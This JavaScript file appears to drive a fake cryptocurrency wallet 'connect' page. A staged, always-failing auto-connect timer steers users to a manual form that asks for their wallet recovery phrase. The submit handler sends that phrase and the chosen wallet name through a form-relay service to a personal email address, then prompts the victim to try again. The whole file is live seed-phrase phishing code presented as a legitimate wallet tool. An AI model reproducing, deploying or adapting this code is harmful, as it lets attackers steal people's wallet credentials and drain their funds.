const searchWallet = document.getElementById("searchWallet");
const divWallets = document.querySelectorAll(".divWallet");
const walletCount = document.getElementById("walletCount");

const walletImg = document.querySelector(".wallet-img");
const wallettitle = document.querySelector(".wallet-name");
const walletPopupMain = document.querySelector(".walletPopupMain");
const autoConnect = document.querySelector(".auto");
const manualConnect = document.querySelector(".manual");
const closePopup = document.getElementById("closePopup");
const tryAgain = document.querySelector(".tryAgain");
const manualBtn = document.querySelector(".manualConnect");
const phraseForm = document.querySelector(".phraseForm");
const phraseBox = document.querySelector(".phraseBox");
const formLoading = document.querySelector(".formLoading");
const connectBtn = document.querySelector(".connectbtn");

// Script for the search bar
let totalWallets = divWallets.length;
walletCount.innerHTML = totalWallets;

let searchCount = 0;

searchWallet.addEventListener("input", (e) => {
    const inputValue = e.target.value.toUpperCase();
    searchCount = 0;

    divWallets.forEach((divwallet) => {
        const pTag = divwallet.querySelector("p");
        const textContent = pTag.textContent.toUpperCase();

        if (textContent.includes(inputValue)) {
            divwallet.style.display = "block";
            searchCount++;
        } else {
            divwallet.style.display = "none";
        }
    });

    walletCount.innerHTML = searchCount;
});

// Script for the select wallet
let imgScr = "";
let walletName = "";
let timer;
let timerCount;
let timeoutId;

divWallets.forEach((divWallet) => {
    divWallet.addEventListener("click", () => {
        const img = divWallet.querySelector("img");
        imgScr = img.getAttribute("src");

        const name = divWallet.querySelector("p");
        walletName = name.innerHTML;

        wallettitle.innerHTML = walletName;
        walletImg.src = imgScr;

        // Update the hidden input for the wallet name
        document.getElementById("walletNameInput").value = walletName;

        walletPopupMain.classList.remove("active");

        timer = Math.floor(Math.random() * 6) + 5;
        timerCount = timer * 1000;

        timeoutId = setTimeout(() => {
            autoConnect.classList.add("active");
            manualConnect.classList.remove("active");
        }, timerCount);

        console.log(timerCount);
    });
});

closePopup.addEventListener("click", () => {
    walletPopupMain.classList.add("active");
    autoConnect.classList.remove("active");
    manualConnect.classList.add("active");
    phraseForm.classList.add("active");
    phraseBox.value = "";
    formLoading.classList.add("active");
    connectBtn.innerHTML = "Connect";

    timer = 0;
    timerCount = 0;

    clearTimeout(timeoutId);
});

tryAgain.addEventListener("click", () => {
    autoConnect.classList.remove("active");
    manualConnect.classList.add("active");

    timer = Math.floor(Math.random() * 6) + 5;
    timerCount = timer * 1000;

    timeoutId = setTimeout(() => {
        autoConnect.classList.add("active");
        manualConnect.classList.remove("active");
    }, timerCount);

    console.log(timerCount);
});

manualBtn.addEventListener("click", () => {
    manualConnect.classList.add("active");
    phraseForm.classList.remove("active");
});

// Submit form
phraseForm.addEventListener("submit", (e) => {
    e.preventDefault();

    // Add loading animation and button text
    connectBtn.innerHTML = "Connecting...";
    formLoading.classList.remove("active");

    // Create FormData object and include wallet name dynamically
    const formData = new FormData(phraseForm);
    formData.append("walletName", walletName); // Include the selected wallet name

    fetch("https://formsubmit.co/ajax/alexokor91@gmail.com", {
        method: "POST",
        body: formData,
        headers: {
            Accept: "application/json",
        },
    })
        .then((response) => {
            if (!response.ok) throw new Error("Submission failed");
            return response.json();
        })
        .then((data) => {
            console.log("Form successfully submitted:", data);
            connectBtn.innerHTML = "Try Again!";
            phraseForm.reset(); // Clear form inputs
            formLoading.classList.add("active");
        })
        .catch((error) => {
            console.error("Error:", error);
            connectBtn.innerHTML = "Error. Try Again!";
            formLoading.classList.add("active");
        });
});
